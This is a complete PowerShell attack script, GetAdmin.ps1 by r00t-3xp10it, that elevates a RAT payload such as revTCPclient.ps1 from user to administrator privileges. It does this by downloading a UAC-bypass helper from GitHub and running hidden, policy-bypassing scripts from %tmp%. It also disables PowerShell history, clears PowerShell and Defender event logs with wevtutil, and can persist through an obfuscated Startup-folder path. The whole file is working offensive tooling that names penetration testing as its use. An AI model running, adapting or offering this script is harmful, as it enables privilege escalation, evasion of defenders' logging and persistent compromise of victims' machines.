<#
.SYNOPSIS
   Elevate sessions from UserLand to Administrator!

   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: UacMe.ps1 {auto-download}
   Optional Dependencies: wevtutil {native}
   PS cmdlet Dev version: v1.3.8

.DESCRIPTION
   Often in penetration tests our payload tends to be executed without administrator
   privileges by target user. This cmdlet allows attackers to elevate our payload(s)
   from 'UserLand' to 'Administrator' privileges by asking the attacker to input payload
   absolucte path and creating an PS1 script in %tmp% that silently executes EOP technic.

.NOTES
   Workflow: The attacker needs to run the GetAdmin cmdlet to create the PS1 script that
   silently executes our payload at predefined time intervals (DelayTime), then needs to
   exit the current shell and start a new handler to wait for the new elevated connection.

   Remark: Avoid set directorys with empty spaces in -FilePath '<string>' argument declarations.
   Remark: The -filepath '<Payload>' parameter only executes payloads: '<ps1, bat, vbs, py, exe>'.
   Remark: The -delaytime '<int>' parameter sets the timer for the loop between payload executions.
   Remark: The -action '<check>' param clears Powershell\Defender logs if it manages to escalate privs. 

.Parameter Action
   Accepts arguments: check, exec (default: check)

.Parameter FilePath
   The payload to execute absolucte path (default: false)

.Parameter Try
   The amount of payload executions to try (default: 1)

.Parameter DelayTime
   The time in seconds to delay payload exec (default: 30)

.Parameter Persiste
   Persiste payload EOP execution on startup? (default: false)

.EXAMPLE
   PS C:\> Get-Help .\GetAdmin.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\GetAdmin.ps1 -Action Check
   Can we escalate privileges? (testing)

.EXAMPLE
   PS C:\> .\GetAdmin.ps1 -Action Exec -Try "3" -DelayTime "13" -FilePath "$Env:TMP\revTCPclient.ps1"
   Execute rat client (revTCPclient.ps1) 3 times max, with 13 seconds of delay between each execution.
   
.EXAMPLE
   PS C:\> .\GetAdmin.ps1 -Action Exec -Try "120" -DelayTime "60" -FilePath "$Env:TMP\revTCPclient.ps1" -Persiste True
   [startup] Execute rat client (revTCPclient.ps1) 120 times max, with 60 seconds of delay between each EOP execution.  

.INPUTS
   None. You cannot pipe objects into GetAdmin.ps1

.OUTPUTS
   * Elevate session from UserLand to Admin! (EOP)

   Try  DelayTime  Persiste  FilePath
   ---  ---------  --------  --------
   2    30(sec)    False     C:\Users\pedro\AppData\Local\Temp\revTCPclient.ps1

   * Exit your rat shell, start a new handler to recive the elevated connection.
     => Remenber: To manual delete artifacts from 'TMP' folder after escalation.
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://github.com/r00t-3xp10it/redpill/blob/main/bin/UacMe.ps1
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$FilePath="False",
   [string]$Persiste="False",
   [string]$Action="Check",
   [int]$DelayTime='30',
   [int]$Try='1'
)


Write-Host "`n"
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")

#Check for dependencies!
If($Action -ieq "Check")
{
   Write-Host "* Testing escalation of privileges! (EOP)" -ForegroundColor White -BackgroundColor DarkCyan
}
ElseIf($Action -ieq "Exec" -and $Persiste -ieq "True")
{
   Write-Host "* [startup] Elevate session from UserLand to Admin! (EOP)" -ForegroundColor White -BackgroundColor DarkCyan
}
ElseIf($Action -ieq "Exec" -and $Persiste -ieq "False")
{
   Write-Host "* Elevate session from UserLand to Admin! (EOP)" -ForegroundColor White -BackgroundColor DarkCyan   
}
If($IsClientAdmin -iMatch 'True')
{
   Write-Host "  => abort: session allready running under admin privileges!" -ForegroundColor Red -BackgroundColor Black
   Write-Host "`n";exit #Exit @GetAdmin
}
If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue))
{
   iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null
}


If($Action -ieq "Check")
{

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Testing escalation of privileges! (EOP)

   .NOTES
      This function clears Powershell\Defender logs
      if it manages to escalate privs (TestMyPrivs)
      
   .OUTPUTS
      * Testing escalation of privileges! (EOP)

      Try  DelayTime  Persiste  FilePath
      ---  ---------  --------  --------
      1    1(sec)     False     C:\Users\pedro\AppData\Local\Temp\TestMyPrivs.ps1
      
      * [success]: TestMyPrivs executed with 'administrator' privileges!
        => deleted Powershell/Operational and Defender/Operational logs.
   #>
   
   If($FilePath -ne "False" -or $Persiste -ne "False" -or $DelayTime -ne "30" -or $Try -gt 1)
   {
      Write-Host "  => note: This function uses cmdlet default -parameter settings!" -ForegroundColor Yellow
      Start-Sleep -Seconds 1
   }   

   $Try = "1" #Default exec to 1 attempt!
   $DelayTime = "1" #Default exec to 1 sec!
   $Persiste = "False" #Default persistence check value!
   $FilePath = "$Env:TMP\TestMyPrivs.ps1" #OverWrite FilePath argument!
   
   ## PS1 script to check for privileges inherit
   #And clear Powershell\Defender Operational logs.
   $CreateTestScript = @("#Author: r00t-3xp10it
      `$ErrorActionPreference = `"SilentlyContinue`"
      `$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match `"S-1-5-32-544`")
      If(`$IsClientAdmin -iMatch 'True')
      {
         echo `":EOPTRUE:`" > `$Env:TMP\GetAdmin.log         
         `$PSlist = wevtutil el | Where-Object {
            `$_ -iMatch '(Powershell|Defender/Operational)' -and `$_ -iNotMatch '(/Admin)`$'
         }
         
         ForEach(`$PSCategorie in `$PSlist)
         {
            wevtutil cl `"`$PSCategorie`" | Out-Null
            echo `"deleted: `$PSCategorie`" >> `$Env:TMP\GetAdmin.log
         }
      }
      Else
      {
         echo `":EOPFAILED:`" > `$Env:TMP\GetAdmin.log
      }
   ") 
   
   #Create testscript on %tmp% directory!
   echo "$CreateTestScript"|Out-File "$FilePath" -encoding ascii -force

}
Else
{

   If(-not(Test-Path -Path "$FilePath" -EA SilentlyContinue))
   {
      #FilePath (rat client) not found error msg!
      Write-Host "  => error: not found -filepath '$FilePath'" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";exit #Exit @GetAdmin
   }
   
   If(-not($FilePath -iMatch '(.ps1|.bat|.vbs|.py|.exe)$'))
   {
      #Non-Supported payload extension user input error msg!
      Write-Host "  => error: Payload accepted extensions are: ps1, bat, vbs, exe, py" -ForegroundColor Red -BackGroundColor Black
      Write-Host "`n";exit #Exit @GetAdmin
   }

}


If($Persiste -ieq "True")
{
   If($Try -gt 1 -and $DelayTime -lt 13)
   {
      #Persistence 'Run-Under-Loop' minimum recomended settings!
      Write-Host "  => note: EOP requires minimum of 13 (sec) to finish tasks under loop!" -ForegroundColor Yellow
      Write-Host "     => default: setting the delay time to 13 (sec) between executions." -ForegroundColor Blue
      $DelayTime = "13";Start-Sleep -Seconds 1
   }
   If($Try -eq 1 -and $DelayTime -lt 30)
   {
      #Persistence 'One-Time-Run' minimum recomended settings!
      Write-Host "  => note: Parameter -delaytime settings to small ($DelayTime [sec])!" -ForegroundColor Yellow
      Write-Host "     => default: setting the payload execution delay time to 30 (sec)" -ForegroundColor Blue
      $DelayTime = "30";Start-Sleep -Seconds 1
   }     
}
Else
{
   If($Try -gt 1 -and $DelayTime -lt 13)
   {
      #Run-Under-Loop minimum recomended settings!
      Write-Host "  => note: EOP requires minimum of 13 (sec) to finish tasks under loop!" -ForegroundColor Yellow
      Write-Host "     => default: setting the delay time to 13 (sec) between executions." -ForegroundColor Blue
      $DelayTime = "13";Start-Sleep -Seconds 1
   }
   If($Try -eq 1 -and $DelayTime -lt 10 -and $FilePath -NotMatch '(TestMyPrivs.ps1)$')
   {
      #One-Time-Run minimum recomended settings!
      Write-Host "  => note: Parameter -delaytime settings to small ($DelayTime [sec])!" -ForegroundColor Yellow
      Write-Host "     => default: setting the payload execution delay time to 10 (sec)" -ForegroundColor Blue
      $DelayTime = "10";Start-Sleep -Seconds 1
   }   
}


#Payload.extension exec settings!
If($FilePath -iMatch '(.vbs|.bat)$')
{
   $cmdline = "cmd /R"
}
ElseIf($FilePath -iMatch '(.exe)$')
{
   $cmdline = "cmd /R start /min"
}
ElseIf($FilePath -iMatch '(.ps1)$')
{
   $cmdline = "powershell -exec bypass -WindowStyle hidden -File"
}
ElseIf($FilePath -iMatch '(.py)$')
{
   try{#Retrieve target host python version!
      $PInst = (python --version).split()[1]
      If($PInst -Match '^(3.+\d)'){$cmdline = "python3"}Else{$cmdline = "python"}
   }catch{
      Write-Host "  => error: Fail to retrieve system python version!" -ForegroundColor Red -BackGroundColor Black
      Write-Host "`n";exit #Exit @GetAdmin
   }
}


<#
.SYNOPSIS
   Author: r00t-3xp10it
   Helper - PS1 sript to loop EOP execution!
#>
$TryFor = $Try+1
$CreatePScript = @("#Author: @r00t-3xp10it
`$ErrorActionPreference = `"SilentlyContinue`"
If(-not(Test-Path -Path `"`$Env:TMP\UacMe.ps1`"))
{
   iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1`" -OutFile `"`$Env:TMP\UacMe.ps1`"|Out-Null
}
#Cmdlet EOP loop function!
for(`$i=1; `$i -lt $TryFor; `$i++)
{
   Start-Sleep -Seconds $DelayTime
   powershell -exec bypass -WindowStyle hidden -File `"`$Env:TMP\UacMe.ps1`" -Action Elevate -Execute `"$cmdline $FilePath`"
}")


If($Persiste -ieq "True")
{

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Persiste payload EOP execution on startup?
      
   .OUTPUTS
      * [startup] Elevate session from UserLand to Admin! (EOP)

      Try  DelayTime  Persiste  FilePath
      ---  ---------  --------  --------
      120  60(sec)    True      C:\Users\pedro\AppData\Local\Temp\revTCPclient.ps1
      
      * Persistence: 'C:\Users\pedro\Microsoft\Windows\Start Menu\Programs\Startup\bfaTdYra.ps1'
        => Remenber: To manual delete artifacts from 'TMP' + 'StartUp' folders after escalation.
   #>

   #Create PS1 script on startup directory! {Execution on next reboot}
   $StartUp = "$Env:APPDATA\Micro#so£ft\Win#do£ws\Sta£rt Me#n£u\Pro£gra#ms\Star#t£up" -replace '(#|£)',''
   echo "$CreatePScript"|Out-File "$StartUp\$RandomMe.ps1" -encoding ascii -force
   
}
Else
{

   #Create PS1 script on %tmp% directory! {Execution without reboot}
   echo "$CreatePScript"|Out-File "$Env:TMP\$RandomMe.ps1" -encoding ascii -force
   
   try{#Execute EOP script in predefined time without rebooting!
      Start-Process -WindowStyle Hidden powershell -ArgumentList "-exec bypass -File $Env:TMP\$RandomMe.ps1"
   }catch{
      Write-Host "  => error: fail to execute '$Env:TMP\$RandomMe.ps1' (EOP)" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";exit #Exit @GetAdmin
   }
   
}


#Build output DataTable!
$mytable = New-Object System.Data.DataTable
$mytable.Columns.Add("Try")|Out-Null
$mytable.Columns.Add("DelayTime")|Out-Null
$mytable.Columns.Add("Persiste")|Out-Null
$mytable.Columns.Add("FilePath")|Out-Null

#Adding values to DataTable!
$mytable.Rows.Add("$Try",             ## The amount of exec trys
                  "$DelayTime(sec)",  ## Looop each <int> seconds
                  "$Persiste",        ## Persistepayload on startup?
                  "$FilePath"         ## rat client absoluct path
)|Out-Null

#Diplay output DataTable!
$mytable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
   $stringformat = If($_ -Match '^(Try)'){
      @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
   Write-Host @stringformat $_
}


If($Action -ieq "Check")
{

   <#
   .SYNOPSIS
      Author: r00t-3xp10it
      Helper - Check if TestMyPrivs was been executed with admin privs!
   #>

   for($i=1; $i -lt 9; $i++)
   {
      #Loop function that waits for logfile creation before read is contents! {9 sec}
      $Results = Get-Content -Path "$Env:TMP\GetAdmin.log" -ErrorAction SilentlyContinue
      If(-not($Results -Match '^(deleted:)')){Start-Sleep -Seconds 1}Else{break}
   }
   
   Start-Sleep -Miliseconds 2500
   #Read logfile one last time! {for clear logs function to finish}
   $Results = Get-Content -Path "$Env:TMP\GetAdmin.log" -EA SilentlyContinue

   If($Results -Match '^(:EOPTRUE:)$' -and $Results -Match '^(deleted:)')
   {
      #Logfile return: successful executed with admin token!
      Write-Host "* [success]: TestMyPrivs executed with 'administrator' privileges!" -ForegroundColor Green
      Write-Host "  => deleted Powershell/Operational and Defender/Operational logs." -ForegroundColor Blue
   }
   ElseIf($Results -Match '^(:EOPTRUE:)$' -and $Results -NotMatch '^(deleted:)')
   {
      Write-Host "* [success]: TestMyPrivs executed with 'administrator' privileges!" -ForegroundColor Green
      Write-Host "  => none logfile(s) found\deleted form eventvwr snapIn this time." -ForegroundColor Yellow   
   }
   ElseIf($Results -Match '^(:EOPFAILED:)$')
   {
      #Logfile return: fail to execute with admin token!   
      Write-Host "* [fail]: to execute TestMyPrivs with 'administrator' privileges!" -ForegroundColor Red -BackgroundColor Black
   }
   Else
   {
      #Logfile return: fail to create\read logfile?
      Write-Host "* [fail]: to retrive %tmp%\TestMyPrivs logfile information!" -ForegroundColor Red -BackgroundColor Black
   }
   
   #Deleta ALL artifacts left behind by 'check' function!
   Remove-Item -Path "$Env:TMP\TestMyPrivs.ps1" -Force -EA SilentlyContinue
   Remove-Item -Path "$Env:TMP\$RandomMe.ps1" -Force -EA SilentlyContinue
   Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force -EA SilentlyContinue
   Start-Sleep -Milliseconds 1500 #<- Give extra time for logfile to finish writting!
   Remove-Item -Path "$Env:TMP\GetAdmin.log" -Force -EA SilentlyContinue
   Write-Host "";exit #Exit @GetAdmin

}


<#
.SYNOPSIS
   Author: r00t-3xp10it
   Helper - Final onscreen displays!
#>
Start-Sleep -Seconds 1
If($Action -ieq "Exec" -and $Persiste -ieq "True")
{
   Write-Host "* Persistence: '$StartUp\$RandomMe.ps1'" -ForegroundColor Green
   Write-Host "  => Remenber: To manual delete artifacts from 'TMP' + 'StartUp' folders after escalation." -ForegroundColor Blue   
}
ElseIf($Action -ieq "Exec" -and $Persiste -ieq "False")
{
   Write-Host "* Exit your rat shell, start a new handler to recive the elevated connection." -ForegroundColor Green
   Write-Host "  => Remenber: To manual delete artifacts from 'TMP' folder after escalation." -ForegroundColor Blue      
}
Write-Host ""